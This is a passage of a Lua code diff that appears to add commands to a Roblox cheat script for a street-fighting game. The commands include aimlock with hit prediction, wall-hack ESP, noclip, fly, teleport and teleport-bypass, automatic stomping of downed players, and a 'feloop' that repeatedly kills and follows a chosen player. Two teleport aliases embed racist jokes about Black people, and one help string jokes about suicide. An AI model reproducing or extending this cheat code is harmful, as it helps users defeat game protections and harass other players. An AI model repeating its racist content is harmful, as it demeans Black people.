+end,"jumppower",{"jp"},"Changes your Humanoids JumpPower")
+
+AddCommand(function(Arguments)
+        if not Arguments[1] then 
+                TeleportService:TeleportToPlaceInstance(game.PlaceId,game.JobId)
+        end
+end,"rejoin",{"rj"},"Rejoins your CURRENT game server")
+
+AddCommand(function(Arguments)
+        if not Arguments[1] then 
+                GetChar():BreakJoints()
+        end
+end,"reset",{"re"},"SUICIDE IS PAINLESS IT BRINGS ON MANY CHANGES")
+
+AirWalk.Anchored = true 
+AirWalk.Size = Vector3.new(5,1,5)
+AirWalk.Transparency = 1 
+AirWalk.Material = "Neon"
+AddCommand(function(Arguments)
+        AirWalkOn = not AirWalkOn 
+        AirWalk.Parent = AirWalkOn and workspace or not AirWalkOn and nil 
+end,"airwalk",{},"Allows you to float in the air")
+
+local NeverSitting = false 
+AddCommand(function()
+NeverSitting = not NeverSitting
+        if NeverSitting then
+                local toParent = workspace:GetDescendants()
+                for i = 1,#toParent do 
+                        if string.find(toParent[i].ClassName:lower(),'seat') then 
+                                toParent[i].Parent = CoreGui
+                        end
+                end
+        else
+                local toParent = CoreGui:GetChildren()
+                for i = 1,#toParent do 
+                        if string.find(toParent[i].ClassName:lower(),'seat') then 
+                                toParent[i].Parent = workspace
+                        end
+                end
+        end
+end,"neversit",{"nsit"},"Never sit")
+
+AddCommand(function()
+        AutoDie = not AutoDie
+end,"autodie",{"autoreset"},"When Ko'ed auto kills you")
+
+AddCommand(function()
+        Noclipping = not Noclipping
+        notif("Command: Noclip: ","Noclip has been set to "..tostring(Noclipping),5,"rbxassetid://1281284684")
+end,"noclip",{},"Allows you to walk through walls")
+
+AddCommand(function(Arguments)
+        if Arguments[1] then 
+                local Player = PlrFinder(Arguments[1])
+                if Player and Player.Character and Player.Character:FindFirstChild'Head' and Player ~= LP then 
+                        Teleport(Player.Character.Head.CFrame)
+                end
+        end
+end,"goto",{"to"},"Teleports you to the selected player")
+
+AddCommand(function()
+        TpBypass = not TpBypass
+        GetChar():BreakJoints()
+end,"tpbypass",{},"Turns on tp bypass")
+
+AddCommand(function(Arguments)
+        if Arguments[1] and tonumber(Arguments[1]) then 
+                ClockTime = Arguments[1]
+        end
+end,"time",{},"Changes the time to the number you set")
+
+AddCommand(function(Arguments)
+        Blinking = not Blinking
+        if Blinking then 
+                if not Arguments[1] or not tonumber(Arguments[1]) then 
+                        BlinkSpeed = 2
+                else 
+                        BlinkSpeed = Arguments[1]
+                end
+        end
+        notif("Blinking","Has been set to "..tostring(Blinking),5,nil) 
+end,"blink",{},"Another form of speed, Uses CFrame")
+
+AddCommand(function(Arguments)
+        if Arguments[1] then 
+                if Arguments[1]:lower() == "shift" then
+                        BlinkMode = "Shift"
+                elseif Arguments[1]:lower() == "none" then 
+                        BlinkMode = "None" -- giving people the illusion of free choice is my motto!
+                end
+                updateSettings()
+        end 
+end,"blinkmode",{},"Changes Blinkmode")
+
+AddCommand(function(Arguments)
+        if readfile and writefile then
+                if Arguments[1] then
+                        if Arguments[1]:lower() == "default" then
+                                Config = "CyrusStreetsAdminSettings"
+                                runsettings()
+                        elseif pcall(readfile,Arguments[1]) then
+                                Config = Arguments[1]
+                                runsettings(Arguments[1])
+                        else
+                                Config = Arguments[1]
+                                savesettings()
+                                runsettings()
+                        end 
+                end 
+        end 
+end,"config",{},"Changes Config") 
+
+AddCommand(function(Arguments)
+        if Arguments[1] then
+                Arguments[1] = Arguments[1]:lower()
+                if Arguments[1] == "banland" then 
+                        TeleportService:Teleport(4669040)
+                elseif Arguments[1] == "normalstreets" then 
+                        TeleportService:Teleport(455366377)
+                elseif Arguments[1] == "uzi" then 
+                        GrabThing("Uzi",GetChar().Head.CFrame)
+                elseif Arguments[1] == "machete" then 
+                        GrabThing("Machete",GetChar().Head.CFrame)
+                elseif Arguments[1] == "spray" then 
+                        GrabThing("Spray",GetChar().Head.CFrame)
+                elseif Arguments[1] == "sawed" or Arguments[1] == "sawedoff" then 
+                        GrabThing("SawedOff",GetChar().Head.CFrame)
+                elseif Arguments[1] == "pipe" then 
+                        GrabThing("Pipe",GetChar().Head.CFrame)
+                elseif Arguments[1] == "glock" then 
+                        GrabThing("Glock",GetChar().Head.CFrame)
+                elseif PartTable and Arguments[1] == "sand" or Arguments[1] == "sandbox" then
+                        Teleport(CFrame.new(-178.60614013672,3.2000000476837,-117.21733093262))
+                elseif PartTable and Arguments[1] == "prison" or Arguments[1] == "jail" or Arguments[1] == "whereblacksgoaftertheyattempttorobsaidbank" then 
+                        Teleport(CFrame.new(-978.74725341797,3.199854850769,-78.541763305664))
+                elseif PartTable and Arguments[1] == "gas" or Arguments[1] == "gasstation" then 
+                        Teleport(CFrame.new(99.135276794434,18.599975585938,-73.462348937988))
+                elseif PartTable and Arguments[1] == "court" or Arguments[1] == "basketballcourt" then 
+                        Teleport(CFrame.new( -191.56864929199,3,223.43171691895))
+                elseif PartTable and Arguments[1] == "beach" then 
+                        Teleport(CFrame.new(-663.97521972656,1.8657279014587,-369.04748535156))
+                elseif PartTable and Arguments[1] == "bank" or Arguments[1] == "whatblacksrob" then
+                        Teleport(CFrame.new(-270.44195556641,4.8757019042969,133.12774658203))
+                end
+        end
+end,"tpto",{"tp"},"Teleports to places [banland/normalstreets/uzi/machete/spray/sawed/sawedoff/pipe/sand/prison/gas/court/beach/bank]")
+
+local FlySpeed = 10
+local FirstFly = true  
+local function fly(SPEED) -- CREDITS TO INFINITE YIELD FOR THIS FLY METHOD (I'M PLANNING TO MAKE MY OWN SOON)
+FlySpeed = SPEED or 10
+        local T = GetChar():FindFirstChild'HumanoidRootPart' or GetChar():FindFirstChild'Torso'
+        if not AirWalkOn then
+                CheckCommand("airwalk") -- decided to use airwalk since it works the best
+        end 
+        local CONTROL = {F = 0, B = 0, L = 0, R = 0}
+        local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
+        local function fly()
+                flying = true
+                local BG = Instance.new('BodyGyro', T)
+                local BV = Instance.new('BodyVelocity', T)
+                BG.P = 9e4
+                BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
+                BG.cframe = T.CFrame
+                BV.velocity = Vector3.new(0, 0.1, 0)
+                BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
+                spawn(function()
+                repeat wait()
+                if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
+                SPEED = 50
+                elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
+                SPEED = 0
+                end
+                if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
+                BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
+                lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
+                elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
+                BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
+                else
+                BV.velocity = Vector3.new(0, 0.1, 0)
+                end
+                BG.cframe = workspace.CurrentCamera.CoordinateFrame
+                                until not flying
+                                CONTROL = {F = 0, B = 0, L = 0, R = 0}
+                                lCONTROL = {F = 0, B = 0, L = 0, R = 0}
+                                SPEED = 0
+                                BG:destroy()
+                                BV:destroy()
+                                LP.Character:FindFirstChildOfClass'Humanoid'.PlatformStand = false
+                                if AirWalkOn then
+                                        CheckCommand("airwalk")
+                                end 
+                        end)
+                end
+        Mouse.KeyDown:connect(function(KEY)
+                if KEY:lower() == 'w' then
+                        CONTROL.F = FlySpeed
+                elseif KEY:lower() == 's' then
+                        CONTROL.B = -FlySpeed
+                elseif KEY:lower() == 'a' then
+                        CONTROL.L = -FlySpeed 
+                elseif KEY:lower() == 'd' then 
+                        CONTROL.R = FlySpeed
+                end
+        end)
+        Mouse.KeyUp:connect(function(KEY)
+                if KEY:lower() == 'w' then
+                        CONTROL.F = 0
+                elseif KEY:lower() == 's' then
+                        CONTROL.B = 0
+                elseif KEY:lower() == 'a' then
+                        CONTROL.L = 0
+                elseif KEY:lower() == 'd' then
+                        CONTROL.R = 0
+                end
+        end)
+        fly()
+        if FirstFly then
+                flying = false 
+                wait(0.5)
+                fly()
+                FirstFly = false
+        end
+end
+
+AddCommand(function(Arguments)
+        if not flying then
+                fly(Arguments[1] and tonumber(Arguments[1]) or 10)
+        else 
+                flying = false 
+        end
+end,"fly",{"f"},"Allows you to be like a bird")
+
+AddCommand(function(Arguments)
+        if Arguments[1] then 
+                if Arguments[1]:lower() == "normal" then 
+                        workspace.CurrentCamera.FieldOfView = OldFov
+                elseif tonumber(Arguments[1]) then 
+                        workspace.CurrentCamera.FieldOfView = Arguments[1]
+                end 
+        end 
+end,"fov",{},"Changes Field Of View")
+
+AddCommand(function(Arguments)
+        if Arguments[1] then 
+                if string.lower(Arguments[1]) == "ws" or string.lower(Arguments[1]) == "speed" then 
+                        GetChar():FindFirstChildWhichIsA'Humanoid'.WalkSpeed = Arguments[2]
+                        Normalwalk = true
+                        SpawnWS = Arguments[2] or NormalWS
+                elseif string.lower(Arguments[1]) == "jp" or string.lower(Arguments[1]) == "jumppower" then 
+                        GetChar():FindFirstChildWhichIsA'Humanoid'.JumpPower = Arguments[2]
+            SpawnJP = Arguments[2] or NormalJP
+        elseif string.lower(Arguments[1]) == "hh" or string.lower(Arguments[1]) == "hipheight" then
+         GetChar():FindFirstChildWhichIsA'Humanoid'.HipHeight = Arguments[2] 
+                        SpawnHH = Arguments[2] or NormalHH
+                end
+        end
+end,"loop",{},"[Ws/Speed/Jp/JumpPower/HH/HipHeight/]")
+
+local AntiAim = false 
+AddCommand(function()
+        if AntiAim then 
+                local Tracks = GetChar().Humanoid:GetPlayingAnimationTracks()
+                for i = 1,#Tracks do 
+                        if string.find(Tracks[i].Animation.AnimationId,"215384594") then 
+                                Tracks[i]:Stop()
+                        end
+                end
+        else
+                local Anim = Instance.new'Animation'
+                Anim.AnimationId = "rbxassetid://215384594"
+                GetChar().Humanoid:LoadAnimation(Anim):play(5,45,250)
+        end
+        AntiAim = not AntiAim
+end,"antiaim",{},"breaks shitty aimbots lol")
+
+
+
+AddCommand(function(Arguments)
+        if Arguments[1] and #Arguments[1] == 1 and Arguments[2] and Keys then
+                for Index,Key in pairs(Keys) do
+                if Key:match("[%a%d]+$") == Arguments[1]:lower() then
+                                table.remove(Keys,Index)
+                        end
+                end
+                local Hotkey = table.remove(Arguments, 1)
+                Keys[#Keys + 1] = table.concat(Arguments, " ").."||"..Hotkey
+                if writefile and readfile then 
+                        updateSettings()
+                end
+        end
+end,"hotkey",{"key"},"Hotkeys a command to a key")
+
+AddCommand(function()
+        DoubleJumpEnabled = not DoubleJumpEnabled
+        notif("Command: DoubleJump","has been set to "..tostring(DoubleJumpEnabled),5,"rbxassetid://1281284684")
+end,"doublejump",{},"Allows you to jump infitely")
+
+AddCommand(function(Arguments)
+        if Arguments[1] then
+                for Index,Key in pairs(Keys) do
+                if Key:match("[%a%d]+$") == Arguments[1]:lower() then
+                                table.remove(Keys,Index)
+                        end
+                end
+        end
+end,"removekey",{"rkey"},"Removes a hotkey to a command")
+
+AddCommand(function()
+        Keys = {}
+        ClickTpKey = ""
+        updateSettings()
+end,"removeallhotkeys",{"removeallkeys"},"Removes all hotkeys")
+
+AddCommand(function(Arguments)
+        if Arguments[1] then
+                Arguments[1] = Arguments[1]:lower()
+                if Arguments[1] == "outline" then 
+                        Cframe.BackgroundColor3 = Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
+                elseif Arguments[1] == "text" then 
+                        CText.BackgroundColor3 = Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
+                elseif Arguments[1] == "background" then 
+                        CmdFrame.BackgroundColor3 = Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
+                elseif Arguments[1] == "damageindicator" then 
+                        DmgIndicator.TextColor3 = Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
+                elseif Arguments[1] == "cmds" then 
+                        local Child = CmdFrame:GetChildren() 
+                        for i = 1,#Child do 
+                                if Child[i]:IsA'TextLabel' then 
+                                        Child[i].BackgroundColor3 = Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
+                                end
+                        end
+                elseif Arguments[1] == "bullet" then
+                        BulletColour = ColorSequence.new(Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0))
+                elseif Arguments[1] == "values" then 
+                        DrawingT.Color = Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
+                elseif Arguments[1] == "itemesp" then
+                        ItemEspColour = Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
+                elseif Arguments[1] == "esp" then 
+                        EspColour = Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
+                else
+                        notif("Command: Colour","Colour: [BackGround/Text/Outline/cmds/damageindicator/bullet/values/itemesp/esp] [rgb]",5,"rbxassetid://1281284684")
+                end
+        end
+end,"colour",{"color"},"Changes elements colours Colour [BackGround/Text/Outline/cmds/damageindicator/bullet/values/itemesp/esp]")
+
+local ViewPlayerConnection,ViewPlayerConnection2;
+AddCommand(function(Arguments)
+        if Arguments[1] then 
+        local Plr = PlrFinder(Arguments[1]) 
+                if Plr and Plr.Character then
+                        if ViewPlayerConnection then ViewPlayerConnection:Disconnect() ViewPlayerConnection = nil ViewPlayerConnection2:Disconnect() ViewPlayerConnection2 = nil end 
+                        workspace.CurrentCamera.CameraSubject = Plr.Character
+                        if Arguments[2] and Arguments[2] == "loop" then
+                                ViewPlayerConnection = Plr.CharacterAdded:Connect(function(C)
+                                        workspace.CurrentCamera.CameraSubject = C
+                                end)
+                                LP.CharacterAdded:Connect(function(C)
+                                        if Plr.Character then
+                                                workspace.CurrentCamera.CameraSubject = Plr.Character -- I don't know if this does anything I coded it at 7am but I remember someone saying view plr loop doesn't work when you respawn so
+                                        end
+                                end)
+                        end
+                end
+        end
+end,"view",{},"Allows you to look through a players vision")
+
+AddCommand(function()
+        if ViewPlayerConnection and ViewPlayerConnection2 then ViewPlayerConnection:Disconnect() ViewPlayerConnection2:Disconnect() ViewPlayerConnection = nil ViewPlayerConnection2 = nil end 
+        workspace.CurrentCamera.CameraSubject = GetChar()
+end,"unview",{},"Brings you back to your normal vision")
+
+
+AddCommand(function(Arguments)
+        if Arguments[1] then
+                if Arguments[1]:lower() == "all" then notif("STOP IT","NO. JUST NO.",10,nil) return end 
+                local Player = PlrFinder(Arguments[1]) 
+                if Player ~= LP and Player and tostring(AimlockTarget) ~= tostring(Player) then
+                        CheckCommand("esp "..Player.Name)
+                        AimLock = true 
+                        AimlockTarget = Player.Character
+                        local Connection; -- Localized so that it is only accessible in this function (Otherwise it would be over-wrote every time this command was called and would never be disconnected)
+                        Connection = Player.CharacterAdded:Connect(function(C)
+                                if tostring(C) == tostring(AimlockTarget) then 
+                                        AimlockTarget = C
+                                else 
+                                        Connection:Disconnect()
+                                end 
+                        end)
+                        notif("AimlockTarget has been set to",AimlockTarget.Name,5,nil)
+                end
+        else
+                AimLock = not AimLock
+                notif("Aimlock","has been set to "..tostring(AimLock),5,"rbxassetid://1281284684")
+        end
+end,"aimlock",{"aim"},"Shoots your gun that is titled 75 degrees at the selected person (Aimlock [Player/nil/loop] - if nil click players to set the aimlock target to them (loop makes it so when they respawn it still locks on)")
+
+local WhiteListedParts = {
+        ['head'] = "Head";
+        ['torso'] = "Torso";
+        ['humanoidrootpart'] = "HumanoidRootPart";
+        ['prediction'] = "Prediction";
+}
+
+AddCommand(function(Arguments)
+        if Arguments[1] then
+                if WhiteListedParts[Arguments[1]:lower()] then
+                        TargetPart = WhiteListedParts[Arguments[1]:lower()]
+                        updateSettings()
+                        notif("AimTarget","has been set to "..TargetPart,5,"rbxassetid://1281284684")
+                end
+        end
+end,"aimtarget",{},"Allows you to pick between a part for aimlock to target/prediction")
+
+AddCommand(function(Arguments)
+        if Arguments[1] and tonumber(Arguments[1]) then 
+                AimbotVelocity = Arguments[1]
+                updateSettings()
+        end 
+end,"aimvelocity",{},"Changes your aimbot prediction velocity default: 5")
+
+AddCommand(function(Arguments)
+        if Arguments[1] then 
+                if Arguments[1] == "all" then 
+                        local Players_ = Players:GetPlayers() 
+                        for i = 1,#Players_ do 
+                                if Players_[i] ~= LP and not table.find(EspTable,Players_[i].UserId) then
+                                        table.insert(EspTable,Players_[i].UserId)
+                                        if not UseDraw or Arguments[2] and Arguments[2]:lower() == "legacy" then 
+                                                espPlayer(Players_[i],"Legacy")
+                                        else 
+                                                espPlayer(Players_[i])
+                                        end
+                                end
+                        end
+                else 
+                        local Player = PlrFinder(Arguments[1])
+                        if not Player then return end 
+                        if Player ~= LP and not table.find(EspTable,Player.UserId) then
+                                table.insert(EspTable,Player.UserId)
+                                if not UseDraw or Arguments[2] and Arguments[2]:lower() == "legacy" then 
+                                        espPlayer(Player,"Legacy")
+                                else
+                                        espPlayer(Player)
+                                end
+                        end
+                end
+        end
+end,"esp",{},"allows you to see the player through walls (Esp [plr] legacy for the old esp (will default if you do NOT have drawing api)")
+
+AddCommand(function(Arguments)
+        if Arguments[1] and Arguments[2] then 
+                if Arguments[1]:lower() == "line" then 
+                        if Arguments[2]:lower() == "thickness" and Arguments[3] then 
+                                DrawTable['Thickness'] = tonumber(Arguments[3])
+                        elseif Arguments[2]:lower() == "transparency" and Arguments[3] then 
+                                DrawTable['Transparency'] = tonumber(Arguments[3])
+                        elseif Arguments[2]:lower() == "visible" then 
+                                DrawTable['Visible'] = not DrawTable['Visible'] 
+                        end 
+                end
+        end 
+end,"espsettings",{},"Changes Drawing API esp settings")
+
+AddCommand(function(Arguments)
+        if Arguments[1] then 
+        local Player = PlrFinder(Arguments[1])
+        if not Player then return end
+        local A = workspace:GetDescendants()
+        table.remove(EspTable,Player.UserId)
+                for i = 1,#A do
+                        if string.sub(A[i].Name, 1, 5) == "[ESP]" and string.sub(A[i].Name, 6) == Player.Name then
+                                A[i]:Destroy()
+                        end
+                end
+                Unesp(Player)
+        else
+                local A = workspace:GetDescendants()
+                EspTable = {}
+                for i = 1,#A do
+                        if string.sub(A[i].Name, 1, 5) == "[ESP]" then
+                                A[i]:Destroy()
+                        end
+                end
+                local P = Players:GetPlayers()
+                for i = 1,#P do 
+                        Unesp(P[i])
+                end 
+        end
+end,"unesp",{},"Removes the esp on the player")
+
+
+AddCommand(function(Arguments)
+        if Arguments[1] then 
+        local Player = PlrFinder(Arguments[1])
+                if Player then 
+                        local FindDecal = workspace:FindFirstChild(Player.Name.."Spray")
+                        if FindDecal and FindDecal:FindFirstChildOfClass'Decal' then 
+                                writefile("DecalLog From "..Player.Name.." "..math.random(1,99)..".txt","Stolen Decal: "..tostring(FindDecal.Decal.Texture:match"%d+").." From: "..Player.Name)
+                                notif("Stole the Decal","From "..Player.Name.." check your exploits workspace folder",5,nil)
+                        end
+                end
+        end
+end,"decalsteal",{},"Steals a persons decal")
+
+
+AddCommand(function(Arguments)
+        CamLocking = not CamLocking
+        if Arguments[1] then
+                local Player = PlrFinder(Arguments[1])
+                if Player then 
+                        CamlockPlayer = Player
+                end
+        end 
+end,"camlock",{"lockcam","cl"},"Different type of aimbot (Uses camera instead of the remote)")
+
+
+AddCommand(function(Arguments)
+        if game.PlaceId == 455366377 then notif("Wont work","Prison Only",5,nil) return end
+        FeLoop = not FeLoop
+        if FeLoop and not CanUseFeloop then
+                wait(0.5)
+                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("To Use Feloop Type k","All")
+                local Chat = LP.Chatted:Wait()
+                if Chat:lower() ~= "k" then LP:Kick('That answer is wrong.') else CanUseFeloop = true end
+        end
+        if Arguments[1] then
+                FeLoop = true 
+                local Player = PlrFinder(Arguments[1])
+                if Player then 
+                        GetChar():BreakJoints()
+                        LoopPlayer = Player 
+                end
+        else
+                LoopPlayer = nil
+        end
+end,"feloop",{},"First you were a skid, Now you're annoying with a simple use of this command!","[Player]")
+
+AddCommand(function(Arguments)
+        if Arguments[1] then 
+                if Arguments[1]:lower() == "leftclick" then 
+                        AimlockMode = "LeftClick"
+                        updateSettings()
+                elseif Arguments[1]:lower() == "rightclick" then 
+                        AimlockMode = "RightClick"
+                        updateSettings()
+                elseif Arguments[1]:lower() == "nomouse" then 
+                        AimlockMode = "NoMouse" 
+                        updateSettings()
+                else
+                        notif("Not a mode","Either type leftclick,rightclick,nomouse")
+                end
+        end
+end,"aimmode",{"aimlockmode"},"Sets aimmode [LeftClick/RightClick]")
+
+AddCommand(function()
+local Table = {}
+        for i = 1,10 do 
+                local Server = HttpService:JSONDecode(game:HttpGet("https://www.roblox.com/games/getgameinstancesjson?placeId="..game.PlaceId.."&startindex="..i)) -- OMG IP LOGGER IT DOES AN HTTP REQUEST - half of people on the streets lol
+                for i = 1,#Server.Collection do 
+                        Table[Server.Collection[i].Ping] = Server.Collection[i].Guid
+                end
+        end
+        for i,v in pairs(Table) do
+                if v ~= game.JobId then 
+                        TeleportService:TeleportToPlaceInstance(game.PlaceId,v)
+                        break
+                end 
+        end 
+end,"serverhop",{},"Server hopping capabilities")
+
+
+local function Temp()
+local Table = {} 
+        for i,v in pairs(CmdFrame:GetChildren()) do
+                table.insert(Table,v.Text)
+        end
+        return Table 
+end 
+
+local WhitelistedOs = {
+        ['durango'] = "Xbox";
+        ['win32'] = "Windows";
+        ['ios'] = "Apple";
+        ['android'] = "Superior Android";
+        ['osx'] = "Mac (GROSS)";
+        ['windows_universal'] = "Windows 10 roblox"
+}
+UserInput.WindowFocusReleased:Connect(function()
+    RobloxInForeground = false 
+    UserInput.WindowFocused:Wait()
+    RobloxInForeground = true 
+end)
+
+local Debounce = false -- this code gets uglier every day holy fuck I'm gonna have to re-write it again soon lmao
+local function Stepped()
+        if GodMode or FeLoop then 
+                if LP.Character:FindFirstChild'Right Leg' then 
+                        LP.Character['Right Leg']:Destroy()
+                end
+        end
+local PartFound = LP.Character:FindFirstChild'HumanoidRootPart' or LP.Character:FindFirstChild'Torso'
+        if Noclipping then 
+                local CDescendant = LP.Character:GetDescendants() 
+                for i = 1,#CDescendant do 
+                        if CDescendant[i]:IsA'Part' then 
+                                CDescendant[i].CanCollide = false
+                        end
+                end
+        end
+        if flying and LP.Character:FindFirstChild'Humanoid' and not Debounce then
+                Debounce = true
+                LP.Character.Humanoid:ChangeState(3)
+                wait(0.2)
+                Debounce = false
+        end 
+        if RainbowHats and LP.Backpack:FindFirstChild'Stank' then 
+                LP.Backpack.Stank:FireServer("rep",RainbowTable2[math.random(1,#RainbowTable2)])
+                LP.Backpack.Stank:FireServer("color",RainbowTable1[math.random(1,#RainbowTable1)])
+        end
+        if TpBypass and LP.Character:FindFirstChild'RealHumanoidRootPart' then 
+                LP.Character:FindFirstChild'RealHumanoidRootPart':Destroy() 
+        end 
+        if ClockTime then 
+                Lighting.ClockTime = ClockTime 
+        end
+        if FeLoop and CanUseFeloop then
+                local BChild = LP.Backpack:GetChildren()
+        for i = 1,#BChild do 
+            BChild[i].Parent = LP.Character
+            if game.PlaceId == 455366377 then 
+                repeat wait() until not LP.Character:FindFirstChildOfClass'Tool'
+            end
+                end
+                if PartFound and LoopPlayer and LoopPlayer.Character and LoopPlayer.Character:FindFirstChild'Torso' then 
+                        PartFound.CFrame = LoopPlayer.Character.Torso.CFrame
+                end 
+        end
+        if AutoStomp then
+                local Players = Players:GetPlayers()
+                for i = 1,#Players do
+                        if Players[i] ~= LP and Players[i].Character and Players[i].Character:FindFirstChild'Head' and Players[i].Character:FindFirstChild'Torso' and not Players[i]:IsFriendsWith(LP.UserId) then
+                                if (PartFound.Position - Players[i].Character.Torso.Position).magnitude < 50  and Players[i].Character:FindFirstChild'KO' and Players[i].Character.Humanoid.Health > 0 and not LP.Character:FindFirstChild'KO' and LP.Character.Humanoid.Health > 0  and not Players[i]:FindFirstChild'Dragged' and not table.find(DontStompWhitelisted,Players[i].UserId) then
+                                        PartFound.CFrame = CFrame.new(Players[i].Character.Torso.Position)
+                                        LP.Backpack.ServerTraits.Finish:FireServer(LP.Backpack:FindFirstChild'Punch' or LP.Character:FindFirstChild'Punch')
+                                end
+                        end
+                end
+        end
+        if AirWalkOn and LP.Character:FindFirstChild'Humanoid' and PartFound then 
+                LP.Character.Humanoid.HipHeight = 0
+                AirWalk.CFrame = PartFound.CFrame * CFrame.new(0,-3.5,0)
+        end
+        if CamLocking and CamlockPlayer and CamlockPlayer.Character and CamlockPlayer.Character:FindFirstChild'Torso' then 
+                workspace.CurrentCamera.CoordinateFrame = CFrame.new(workspace.CurrentCamera.CoordinateFrame.p,CamlockPlayer.Character.Head.CFrame.p)
+        end
+    for i = 1,#PlayerTable do
+                local Player,TopLeft,TopRight,BottomLeft,BottomRight = PlayerTable[i][1],PlayerTable[i][2],PlayerTable[i][3],PlayerTable[i][4],PlayerTable[i][5]
+                local Text,Tracer,IsUser = PlayerTable[i][6],PlayerTable[i][7],PlayerTable[i][8]
+                 if Player and Player.Character and Player.Character:FindFirstChild'Head' and LP.Character and LP.Character:FindFirstChild'Head' then 
+                         local Part = Player.Character:FindFirstChild'HumanoidRootPart' or Player.Character:FindFirstChild'Torso'
+                         if Part then
+                                 local Cframe = Part.CFrame
+                                 local h = Player.Character.Head.Size.Y / 2
+                                 local Size = Vector3.new(2,3,0) * (h * 2)
+                                 local RelativeHeadPos,TextOnScreen = workspace.CurrentCamera:WorldToViewportPoint(Player.Character.Head.Position)
+                                 local TopLeftPos = workspace.CurrentCamera:WorldToViewportPoint((Cframe * CFrame.new(Size.X,Size.Y,0)).p)
+                                 local TopRightPos = workspace.CurrentCamera:WorldToViewportPoint((Cframe * CFrame.new(-Size.X,Size.Y,0)).p)
+                                 local BottomLeftPos = workspace.CurrentCamera:WorldToViewportPoint((Cframe * CFrame.new(Size.X,-Size.Y,0)).p)
+                                 local BottomRightPos = workspace.CurrentCamera:WorldToViewportPoint((Cframe * CFrame.new(-Size.X,-Size.Y,0)).p)
+                                 if RobloxInForeground then 
+                                         TopLeft.Visible = TextOnScreen
+                                         TopRight.Visible = TextOnScreen
+                                         BottomLeft.Visible = TextOnScreen
+                                         BottomRight.Visible = TextOnScreen
+                                         if DrawTable['Visible'] then 
+                                                 Tracer.Visible = TextOnScreen
+                                         else 
+                                                Tracer.Visible = false
+                                         end 
+                                         Text.Visible = TextOnScreen
+                                 else 
+                                         TopLeft.Visible = false
+                                         TopRight.Visible = false
+                                         BottomLeft.Visible = false
+                                         BottomRight.Visible = false
+                                         Tracer.Visible = false
+                                         Text.Visible = false
+                                 end 
+                                 if TextOnScreen and RobloxInForeground then
+                                         Text.Position = Vector2.new(RelativeHeadPos.X,RelativeHeadPos.Y) + Vector2.new(0,-30)
+                                         Text.Center = true
+                                         Text.Color = EspColour
+                                         Text.Text = Player.Name.." | Health: "..checkHp(Player.Character).." | Necron is a GOD: "..IsUser.."\nHas: Glock "..hasItem(Player,"Glock").." | Shotty "..hasItem(Player,"Shotty").." | Vest "..hasItem(Player,"BulletResist")
+                                         TopLeft.From = Vector2.new(TopLeftPos.X,TopLeftPos.Y)
+                                         TopLeft.To = Vector2.new(TopRightPos.X,TopRightPos.Y)
+                                         TopRight.From = Vector2.new(TopRightPos.X,TopRightPos.Y)
+                                         TopRight.To = Vector2.new(BottomRightPos.X,BottomRightPos.Y)
+                                         BottomLeft.From = Vector2.new(BottomLeftPos.X,BottomLeftPos.Y)
+                                         BottomLeft.To = Vector2.new(TopLeftPos.X,TopLeftPos.Y)
+                                         BottomRight.From = Vector2.new(BottomRightPos.X,BottomRightPos.Y)
+                                         BottomRight.To = Vector2.new(RelativeHeadPos.X,RelativeHeadPos.Y)
+                                         if tostring(Player) == tostring(AimlockTarget) or tostring(Player) == tostring(CamlockPlayer) then 
+                                                Tracer.Color = Color3.fromRGB(218, 133, 65)
+                                         else 
+                                                Tracer.Color = DrawTable['LineColour']
+                                         end
+                                         Tracer.Thickness = DrawTable['Thickness']
+                                         Tracer.Transparency = DrawTable['Transparency']
+                                         Tracer.From = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2,workspace.CurrentCamera.ViewportSize.X / 2 + 400)
+                                         Tracer.To = Vector2.new(RelativeHeadPos.X,RelativeHeadPos.Y)
+                                 end
+                         end
+                 end
+         end 
+end
+
+local function CChildAdded(Thing)
+        if Thing.Name == "KO" and AutoDie then 
+                GetChar():BreakJoints()
+        end
+end
+
+Cframe.BackgroundColor3 = Color3.new(0.666667,0,0)
+Cframe.BackgroundTransparency = 0.20000000298023
+Cframe.BorderSizePixel = 0
+Cframe.Position = UDim2.new(0, 0, 1, 0)
+Cframe.Size = UDim2.new(0, 270, 0, 35)
+
+CText.BackgroundColor3 = Color3.new(0,0.000738177,0.000738177)
+CText.BorderSizePixel = 0
+CText.Position = UDim2.new(0, 5, 0, 5)
+CText.Size = UDim2.new(0, 260, 0, 25)
+CText.Font = Enum.Font.SourceSansLight
+CText.Text = ""
+CText.TextColor3 = Color3.new(1, 1, 1)
+CText.TextScaled = true
+CText.TextSize = 14
